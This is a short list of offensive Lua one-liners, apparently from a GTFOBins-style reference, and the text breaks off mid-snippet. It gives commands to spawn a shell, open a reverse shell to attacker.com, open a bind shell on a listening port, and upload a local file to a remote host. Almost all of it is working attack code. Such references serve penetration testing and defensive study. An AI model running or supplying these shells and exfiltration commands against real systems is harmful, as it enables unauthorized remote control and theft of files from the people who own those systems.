shell: lua -e 'os.execute("/bin/sh")'
non-interactive-reverse-shell: export RHOST=attacker.com
export RPORT=12345
lua -e 'local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'

non-interactive-bind-shell: export LPORT=12345
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'

file-upload: RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
lua -e '
  local f=io.open(os.getenv("LFILE"), 'rb')
